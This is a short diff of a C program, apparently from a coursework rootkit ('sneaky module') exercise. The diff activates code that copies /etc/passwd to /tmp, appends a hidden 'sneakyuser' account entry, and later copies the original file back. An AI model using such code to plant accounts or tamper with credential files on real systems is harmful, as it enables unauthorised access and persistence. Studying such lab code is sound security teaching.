@@ -5,15 +5,19 @@
 #include <string.h>
 
 void pwdswap(void) {
-  //  system("sudo cp /etc/passwd /tmp/passwd");
-  // system("sudo cp /tmp/passwd /tmp/passwd_phony);
+  system("sudo cp /etc/passwd /tmp/passwd");
+  //system("sudo cp /tmp/passwd /tmp/passwd_phony");
   FILE * passwd = fopen("/etc/passwd", "at+");
   if (passwd == NULL) {
     perror("File Opening");
     return;
   }
-  // fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",50,1,passwd);
-  //fclose(passwd);
+  fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n",50,1,passwd);
+  fclose(passwd);
+
+  //print out appended passwd file
+  //system("cat /etc/passwd");
+
 }
 
 
@@ -51,6 +55,13 @@ int main(void) {
   //  system("sudo rmmod sneaky_mod.ko");
 
   */
+  
+  //copy origina file back to its correct place
+  system("cp /tmp/passwd /etc/passwd");
+
+  //printf("Output of /etc/passwd after restoring original!\n");
+  //system("cat /etc/passwd");
+
   return EXIT_SUCCESS;
 
 }
